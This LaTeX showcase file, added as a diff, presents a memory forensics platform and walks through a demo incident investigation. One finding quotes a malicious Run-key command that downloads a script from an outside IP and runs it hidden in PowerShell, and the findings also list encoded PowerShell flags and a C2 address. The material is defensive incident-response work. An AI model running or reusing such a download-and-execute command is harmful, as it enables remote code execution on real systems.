@@ -1,0 +1,353 @@
+% =====================================================================
+%  Memory Forensics Platform — LinkedIn Showcase (Overleaf-ready)
+%
+%  HOW TO USE
+%  ----------
+%  1. Create a new project on Overleaf and paste this file as `main.tex`.
+%  2. Drop your screenshots into a folder named `images/` next to it.
+%  3. Replace every  \includegraphics{images/PLACEHOLDER_*.png}
+%     with your own screenshot filenames.
+%  4. Compile with pdfLaTeX (Overleaf's default).
+% =====================================================================
+\documentclass[11pt,a4paper]{article}
+
+% ---------- Packages (all standard on Overleaf) ----------
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage[margin=2.2cm]{geometry}
+\usepackage{xcolor}
+\usepackage{graphicx}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{caption}
+\usepackage{tcolorbox}
+\usepackage{hyperref}
+
+% ---------- Colors ----------
+\definecolor{accent}{HTML}{0EA5E9}     % cyan   (standard mode)
+\definecolor{accent2}{HTML}{A855F7}    % fuchsia (deep mode)
+\definecolor{sevcrit}{HTML}{DC2626}
+\definecolor{sevhigh}{HTML}{EA580C}
+\definecolor{sevmed}{HTML}{F59E0B}
+\definecolor{ink}{HTML}{0F172A}
+\definecolor{slate}{HTML}{475569}
+
+\hypersetup{colorlinks=true, linkcolor=accent, urlcolor=accent}
+
+% ---------- Section style ----------
+\titleformat{\section}{\color{accent}\Large\bfseries}{\thesection}{0.6em}{}
+\titleformat{\subsection}{\color{ink}\large\bfseries}{\thesubsection}{0.6em}{}
+
+% ---------- Severity pills ----------
+\newcommand{\sevcrit}{\colorbox{sevcrit}{\textcolor{white}{\textbf{\footnotesize CRITICAL}}}}
+\newcommand{\sevhigh}{\colorbox{sevhigh}{\textcolor{white}{\textbf{\footnotesize HIGH}}}}
+\newcommand{\sevmed}{\colorbox{sevmed}{\textcolor{black}{\textbf{\footnotesize MEDIUM}}}}
+
+% ---------- MITRE chip ----------
+\newcommand{\mitre}[1]{\colorbox{accent!18}{\texttt{\footnotesize #1}}}
+
+% ---------- Screenshot helper ----------
+% Wraps an image with a caption, framed border and consistent width.
+\newcommand{\screenshot}[3]{%
+  \begin{figure}[h!]\centering
+    \fbox{\includegraphics[width=#3\linewidth]{#1}}
+    \caption{#2}
+  \end{figure}}
+
+% =====================================================================
+\begin{document}
+
+% ---------- Title ----------
+\begin{center}
+{\color{accent}\Huge\bfseries Memory Forensics Platform}\\[6pt]
+{\large\color{slate} A self-hosted incident-response \& threat-hunting console}\\[14pt]
+{\small Author: \textbf{Tarek Mazen} \quad$\cdot$\quad Stack: Django $\cdot$ Celery $\cdot$ Volatility 3 $\cdot$ React $\cdot$ Docker}\\
+\rule{\linewidth}{0.4pt}
+\end{center}
+
+% =====================================================================
+\section{Overview}
+
+\textbf{Memory Forensics Platform (MFP)} turns Volatility~3 from a command-line
+oracle into a collaborative SOC console. An analyst uploads a memory image
+(RAM dump, hibernation file, VM snapshot) and the platform automatically:
+
+\begin{itemize}[leftmargin=1.2em,itemsep=2pt]
+  \item Hashes it (SHA-256) and stamps it into a \textbf{chain-of-custody} ledger.
+  \item Runs up to \textbf{25 Volatility~3 plugins} in parallel via Celery.
+  \item Pipes every plugin through \textbf{15+ heuristic detectors} plus a
+        \textbf{cross-plugin correlator} (hidden processes, hidden modules,
+        injected processes beaconing to public IPs\dots).
+  \item Tags every finding with \textbf{MITRE ATT\&CK} techniques, promotes it
+        to a deduplicated IOC, and weaves it into a case timeline.
+  \item Exposes everything through a JWT-secured REST API and a polished
+        React dashboard.
+\end{itemize}
+
+\screenshot{images/PLACEHOLDER_dashboard.png}{Main dashboard — case overview with risk scores and recent activity.}{1.0}
+
+% =====================================================================
+\section{Architecture}
+
+\begin{tcolorbox}[colback=accent!6, colframe=accent, boxrule=0.5pt, arc=2pt]
+\textbf{Backend.} Django 5 + DRF, JWT auth, Celery 5.4 worker pool, Redis broker,
+Volatility~3 with persistent symbol cache.\\[3pt]
+\textbf{Frontend.} React 18 + Vite + Tailwind, custom dark theme, resumable
+chunked upload for multi-GB images.\\[3pt]
+\textbf{Deployment.} Docker compose: \texttt{nginx, backend, worker, beat,
+redis, frontend} — one-command stand-up.
+\end{tcolorbox}
+
+\screenshot{images/PLACEHOLDER_architecture.png}{Stack architecture (replace with your own diagram or compose-graph screenshot).}{0.9}
+
+% =====================================================================
+\section{Detection Engine \& MITRE Mapping}
+
+The detection engine ships with two layers:
+
+\begin{itemize}[leftmargin=1.2em,itemsep=2pt]
+  \item \textbf{Per-plugin detectors} — each consumes the parsed rows of one
+        Volatility plugin and emits \texttt{Detection} records with severity,
+        score, evidence, and ATT\&CK techniques.
+  \item \textbf{Cross-plugin correlator} — composite findings that need
+        signal from \emph{multiple} plugins (e.g.\ a PID present in
+        \texttt{psscan} but missing from \texttt{pslist} = hidden process).
+\end{itemize}
+
+\begin{center}
+\renewcommand{\arraystretch}{1.2}
+\begin{tabular}{>{\bfseries}p{3.2cm} p{6.2cm} p{4.6cm}}
+\toprule
+\textbf{Plugin / Source} & \textbf{Behaviour caught} & \textbf{ATT\&CK} \\
+\midrule
+windows.malfind        & Code injection / hollowing                   & \mitre{T1055} \mitre{T1055.012} \\
+windows.pslist         & Office spawns shell, LOLBIN abuse,
+                         offensive tools, parent anomalies            & \mitre{T1566.001} \mitre{T1059.001} \\
+windows.cmdline        & Encoded PowerShell, IEX, certutil            & \mitre{T1027} \mitre{T1059} \\
+windows.netscan        & C2 ports, public-IP beaconing                & \mitre{T1571} \mitre{T1071} \\
+windows.svcscan        & Service binary in user-writable path         & \mitre{T1543.003} \\
+windows.ldrmodules     & Process-hollowing (loader-list miss)         & \mitre{T1055.012} \\
+windows.callbacks      & Non-Microsoft kernel callback                & \mitre{T1547.013} \\
+windows.ssdt           & SSDT hook                                    & \mitre{T1014} \\
+windows.handles        & Cross-process handle to LSASS                & \mitre{T1003.001} \\
+windows.privileges     & SeDebug / SeImpersonate held by user app     & \mitre{T1134} \\
+windows.registry.printkey & Run / RunOnce points at LOLBIN            & \mitre{T1547.001} \\
+\textit{xview.process} & Hidden process (psscan $\setminus$ pslist)   & \mitre{T1014} \mitre{T1055} \\
+\textit{xview.module}  & Hidden kernel module                         & \mitre{T1014} \\
+\textit{xview.implant} & Injected proc + public-IP beacon             & \mitre{T1055} \mitre{T1071} \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\paragraph{Risk aggregation.} Sub-linear curve so a single finding raises the
+score but no noisy plugin saturates it:
+\[
+R \;=\; 100 \cdot \left(1 - e^{-\Sigma w / 200}\right),
+\qquad
+w \in \{\text{info:1, low:5, medium:15, high:30, critical:50}\}.
+\]
+
+\screenshot{images/PLACEHOLDER_analysis_view.png}{Analysis view — MITRE chips, severity-coloured detection cards, per-plugin tabs.}{1.0}
+
+% =====================================================================
+\section{Scenario — Operation Nightjar}
+
+\begin{tcolorbox}[colback=ink!4, colframe=ink, boxrule=0.5pt, arc=2pt]
+\renewcommand{\arraystretch}{1.2}
+\begin{tabular}{rl}
+\textbf{Case ID:}      & \texttt{IR-2026-0042} \\
+\textbf{Asset:}        & \texttt{WIN7-FIN-04} (Finance dept.\ workstation) \\
+\textbf{Trigger:}      & EDR alert: anomalous outbound TCP/4444 from svchost-like process \\
+\textbf{Image:}        & \texttt{WIN7-FIN-04\_2026-05-08.raw} (2.0 GB) \\
+\textbf{SHA-256:}      & \texttt{c47e\dots a91f} \\
+\textbf{Lead analyst:} & T. Mazen \\
+\end{tabular}
+\end{tcolorbox}
+
+\subsection{Step 1 — Case onboarding}
+
+The analyst creates the case, drags the \texttt{.raw} file into the upload
+zone. The chunked uploader streams the 2~GB image while computing SHA-256 in
+flight. On finalize, the platform records hash, uploader and timestamp into
+the case's chain-of-custody ledger.
+
+\screenshot{images/PLACEHOLDER_upload.png}{Resumable chunked upload (multi-GB capable).}{0.95}
+
+\subsection{Step 2 — Standard analysis}
+
+A click on \textbf{Analyze} queues a Celery job that runs the standard
+11-plugin set. Volatility detects \texttt{Windows~7~SP1~x64} and parses every
+plugin into structured JSON. \emph{Initial risk score: 42/100.}
+
+\screenshot{images/PLACEHOLDER_standard_analysis.png}{Standard analysis result — initial findings and risk gauge.}{1.0}
+
+\subsection{Step 3 — Deep analysis}
+
+Because the standard pass already shows suspicious activity, the analyst
+clicks the \textbf{Deep analysis} (fuchsia) button. The platform queues a
+25-plugin sweep including \texttt{psscan}, \texttt{ldrmodules},
+\texttt{callbacks}, \texttt{ssdt}, \texttt{driverscan},
+\texttt{registry.userassist}, and credential plugins. After ~9 minutes the
+post-processor runs the cross-plugin correlator.
+
+\begin{center}
+\textbf{Final risk score:} \colorbox{sevcrit}{\textcolor{white}{\textbf{ 87 / 100 }}}
+\quad\textbf{Mode:} \colorbox{accent2}{\textcolor{white}{\textbf{ DEEP }}}
+\end{center}
+
+\screenshot{images/PLACEHOLDER_deep_analysis.png}{Deep analysis — MITRE technique cloud and cross-plugin findings.}{1.0}
+
+% --------- findings ---------
+\subsection{Top findings}
+
+\begin{tcolorbox}[colback=sevcrit!5, colframe=sevcrit, boxrule=0.5pt, arc=2pt,
+  title={\bfseries Finding 1 — Office spawned a shell}, coltitle=white,
+  colbacktitle=sevcrit]
+\sevcrit\quad \mitre{T1566.001} \mitre{T1059.001}\\[3pt]
+\textbf{Plugin:} \texttt{windows.pslist}\quad\textbf{PID:} 3168\\
+\texttt{WINWORD.EXE} (PPID 2104) spawned \texttt{powershell.exe} with
+\texttt{-nop -w hidden -ep bypass -enc \dots} — classic phishing payload.
+\end{tcolorbox}
+
+\begin{tcolorbox}[colback=sevcrit!5, colframe=sevcrit, boxrule=0.5pt, arc=2pt,
+  title={\bfseries Finding 2 — Injected process beaconing},
+  coltitle=white, colbacktitle=sevcrit]
+\sevcrit\quad \mitre{T1055} \mitre{T1071}\\[3pt]
+\textbf{Source:} cross-plugin correlator (\textit{xview.implant})\\
+PID 3168 has \texttt{PAGE\_EXECUTE\_READWRITE} regions reported by
+\texttt{malfind} \emph{and} an established TCP connection to
+\textbf{185.220.101.42:4444}.
+\end{tcolorbox}
+
+\begin{tcolorbox}[colback=sevhigh!5, colframe=sevhigh, boxrule=0.5pt, arc=2pt,
+  title={\bfseries Finding 3 — Persistence Run-key},
+  coltitle=white, colbacktitle=sevhigh]
+\sevhigh\quad \mitre{T1547.001}\\[3pt]
+\textbf{Plugin:} \texttt{windows.registry.printkey}\\
+\texttt{HKCU\textbackslash\dots\textbackslash Run\textbackslash WinUpdate}
+$=$ \texttt{powershell -w hidden -c "iex(New-Object Net.WebClient)
+.DownloadString('http://185.220.101.42/u')"}
+\end{tcolorbox}
+
+\begin{tcolorbox}[colback=sevhigh!5, colframe=sevhigh, boxrule=0.5pt, arc=2pt,
+  title={\bfseries Finding 4 — LSASS handle from non-system process},
+  coltitle=white, colbacktitle=sevhigh]
+\sevhigh\quad \mitre{T1003.001}\\[3pt]
+\textbf{Plugin:} \texttt{windows.handles}\\
+\texttt{powershell.exe} (PID 3168) holds a \emph{Process} handle to
+\texttt{lsass.exe} — credential-dumping precursor.
+\end{tcolorbox}
+
+\begin{tcolorbox}[colback=sevhigh!5, colframe=sevhigh, boxrule=0.5pt, arc=2pt,
+  title={\bfseries Finding 5 — Hidden process},
+  coltitle=white, colbacktitle=sevhigh]
+\sevhigh\quad \mitre{T1014} \mitre{T1055}\\[3pt]
+\textbf{Source:} cross-plugin correlator (\textit{xview.process})\\
+PID 4012 (\texttt{svchost.exe}) was found by \texttt{psscan} but is
+\textbf{absent} from \texttt{pslist}'s active-process walk — DKOM-style
+hiding.
+\end{tcolorbox}
+
+\screenshot{images/PLACEHOLDER_detections.png}{Detection cards with severity pills, plugin name, PID, and clickable MITRE chips.}{1.0}
+
+% --------- IOCs ---------
+\subsection{Indicators of compromise (auto-promoted)}
+
+\begin{center}
+\renewcommand{\arraystretch}{1.2}
+\begin{tabular}{l l c l}
+\toprule
+\textbf{Kind} & \textbf{Value} & \textbf{Severity} & \textbf{Source} \\
+\midrule
+ip       & 185.220.101.42                                                & \sevcrit & netscan \\
+process  & powershell.exe (PID 3168)                                     & \sevcrit & malfind / xview \\
+process  & svchost.exe (PID 4012, hidden)                                & \sevhigh & xview.process \\
+path     & \%APPDATA\%\textbackslash WinUpdate\textbackslash u.ps1       & \sevhigh & filescan \\
+registry & HKCU\textbackslash\dots\textbackslash Run\textbackslash WinUpdate & \sevhigh & registry.printkey \\
+other    & cmdline:\ powershell -nop -w hidden -enc \dots                & \sevhigh & cmdline \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\screenshot{images/PLACEHOLDER_iocs.png}{IOC view — deduplicated indicators with MITRE tags.}{1.0}
+
+% --------- timeline ---------
+\subsection{Case timeline}
+
+The platform fuses process creates, network connections and service events
+into a single timeline so the analyst can read the attack chronologically.
+
+\screenshot{images/PLACEHOLDER_timeline.png}{Case timeline view (process create / network / service events).}{1.0}
+
+% --------- containment ---------
+\subsection{Containment \& outcome}
+
+\begin{itemize}[leftmargin=1.2em,itemsep=2pt]
+  \item \textbf{Network:} 185.220.101.42 added to perimeter blocklist
+        (firewall + DNS sinkhole).
+  \item \textbf{Endpoint:} \texttt{WIN7-FIN-04} isolated; image preserved
+        with verified hash.
+  \item \textbf{Identity:} forced password reset for the logged-in user;
+        Kerberos TGT revoked.
+  \item \textbf{Threat-hunt:} fleet-wide search for the same Run-key value.
+  \item \textbf{Report:} PDF generated by the platform, signed by the lead
+        analyst, attached to ticket \texttt{IR-2026-0042}.
+\end{itemize}
+
+\begin{tcolorbox}[colback=accent!6, colframe=accent, boxrule=0.5pt, arc=2pt]
+What would have been a multi-hour blind plugin-by-plugin pivot in a terminal
+became an \textbf{18-minute guided investigation} with a written narrative,
+clickable MITRE chain, deduplicated IOCs, and a sealed chain-of-custody —
+all without leaving the browser.
+\end{tcolorbox}
+
+\screenshot{images/PLACEHOLDER_report.png}{Generated PDF report attached to the case.}{1.0}
+
+% =====================================================================
+\section{Tech Highlights}
+
+\begin{itemize}[leftmargin=1.2em,itemsep=2pt]
+  \item \textbf{Security:} 15+ original Volatility detectors, cross-plugin
+        correlation, MITRE ATT\&CK mapping, sub-linear risk scoring.
+  \item \textbf{Backend:} Django 5 / DRF / Celery / Redis, RBAC, JWT
+        auto-refresh, immutable audit log, idempotent migrations.
+  \item \textbf{Frontend:} React 18 + Vite + Tailwind, dark theme, auth-aware
+        blob downloads, per-plugin tabbed analysis viewer.
+  \item \textbf{DevOps:} Docker compose stack, persistent Volatility symbol
+        cache, resilient Nginx (Docker DNS resolver — no 502 after rebuilds),
+        resumable multi-GB chunked uploads.
+\end{itemize}
+
+% =====================================================================
+\section*{LinkedIn Caption (ready to paste)}
+
+\begin{tcolorbox}[colback=accent!6, colframe=accent, boxrule=0.5pt, arc=2pt]
+\small\itshape
+Just shipped: \textbf{Memory Forensics Platform} — a self-hosted incident-response
+console that turns Volatility~3 from a command-line oracle into a collaborative
+SOC tool. Drag-and-drop a memory dump and get a MITRE ATT\&CK-mapped, IOC-rich,
+chain-of-custody-signed investigation report in minutes.\\[6pt]
+\textbf{Stack:} Django 5 + DRF $\cdot$ Celery 5.4 + Redis $\cdot$ Volatility~3
+$\cdot$ React 18 + Vite + Tailwind $\cdot$ Docker.\\[4pt]
+\textbf{Highlights:} 25-plugin "deep" mode $\cdot$ 15+ heuristic detectors
+$\cdot$ cross-plugin correlator (hidden processes / hidden modules /
+injected-and-beaconing) $\cdot$ MITRE ATT\&CK chips $\cdot$ sub-linear risk
+scoring $\cdot$ resumable multi-GB uploads $\cdot$ JWT-secured API $\cdot$
+immutable audit log.\\[4pt]
+In the demo \emph{Operation Nightjar} scenario, the platform takes an
+\textbf{18-minute path} from raw memory dump to written report — phishing
+chain reconstruction, LSASS-handle credential-dump warning, hidden process
+detection, persistence Run-key call-out, and C2 IOCs.\\[6pt]
+\#DFIR \#MemoryForensics \#Volatility \#IncidentResponse \#BlueTeam
+\#Python \#Django \#React \#MITREATTACK
+\end{tcolorbox}
+
+\vfill
+\begin{center}\small\color{slate}
+Memory Forensics Platform — Showcase document.
+\end{center}
+
+\end{document}
